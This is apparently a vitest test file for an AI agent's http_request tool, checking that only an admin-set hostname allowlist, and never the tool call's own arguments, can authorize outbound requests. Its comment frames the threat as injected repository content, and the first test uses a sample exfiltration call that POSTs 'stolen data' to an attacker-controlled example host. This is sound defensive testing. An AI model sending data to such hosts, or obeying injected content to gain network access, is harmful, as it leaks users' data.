import { describe, expect, it } from 'vitest';
import { executeHttpRequest, isHostnameAllowlisted } from '../httpTools';
import type { AiHttpSettings } from '../../../../../../shared/api/contracts/ai/types';

/**
 * V5 Phase P09 § V5-14 — regression-guarding proof of the phase's literal DoD: "Repository text
 * alone cannot authorize network + shell capability." No test previously existed for this file
 * (confirmed by glob search before writing this one). `settings.allowedHostnames` is the only
 * thing that authorizes a host, and it comes exclusively from `deps.getHttpSettings()` — an
 * admin-controlled platform setting the tool call's own `args` (where injected repository/tool
 * content would land) can never influence.
 */
describe('V5 P09 § V5-14 — http_request capability firewall', () => {
  const buildSettings = (allowedHostnames: readonly string[]): AiHttpSettings => ({
    allowedHostnames: [...allowedHostnames],
  } as AiHttpSettings);

  // Bypasses the (separately tested) SSRF/DNS validator so these cases isolate the
  // capability-authorization question — does the hostname allowlist alone gate the request.
  const identityValidateUrl = async (raw: string) => new URL(raw);

  it('rejects a URL whose host is not admin-allowlisted, no matter how the request is framed', async () => {
    const result = await executeHttpRequest(
      { url: 'https://attacker-controlled.example.com/exfiltrate', method: 'POST', body: 'stolen data' },
      {
        getHttpSettings: () => buildSettings(['api.trusted-partner.com']),
        validateUrl: identityValidateUrl,
        fetchImpl: async () => {
          throw new Error('fetch should never be called — request must be rejected before fetch');
        },
      },
    );

    expect(result.ok).toBe(false);
    expect((result as { error: string }).error).toBe('hostname_not_allowlisted');
  });

  it('rejects every request when the platform allowlist is empty, regardless of args', async () => {
    const result = await executeHttpRequest(
      { url: 'https://anything.example.com' },
      {
        getHttpSettings: () => buildSettings([]),
        validateUrl: identityValidateUrl,
        fetchImpl: async () => {
          throw new Error('fetch should never be called');
        },
      },
    );

    expect(result.ok).toBe(false);
    expect((result as { error: string }).error).toBe('http_allowlist_empty');
  });

  it('only succeeds once the SAME host is added to the admin-controlled settings — proving args alone never grants capability', async () => {
    const targetUrl = 'https://api.trusted-partner.com/data';

    const deniedBeforeAllowlisting = await executeHttpRequest(
      { url: targetUrl },
      {
        getHttpSettings: () => buildSettings([]),
        validateUrl: identityValidateUrl,
        fetchImpl: async () => { throw new Error('must not be called'); },
      },
    );
    expect(deniedBeforeAllowlisting.ok).toBe(false);

    const allowedAfterAdminConfig = await executeHttpRequest(
      { url: targetUrl },
      {
        getHttpSettings: () => buildSettings(['api.trusted-partner.com']),
        validateUrl: identityValidateUrl,
        fetchImpl: async () => new Response('{"ok":true}', { status: 200, headers: { 'content-type': 'application/json' } }),
      },
    );
    expect(allowedAfterAdminConfig.ok).toBe(true);
  });

  it('isHostnameAllowlisted is case-insensitive and exact-match only (no wildcard/subdomain surprise)', () => {
    expect(isHostnameAllowlisted('API.Trusted-Partner.com', ['api.trusted-partner.com'])).toBe(true);
    expect(isHostnameAllowlisted('evil.api.trusted-partner.com', ['api.trusted-partner.com'])).toBe(false);
    expect(isHostnameAllowlisted('trusted-partner.com', ['api.trusted-partner.com'])).toBe(false);
  });
});
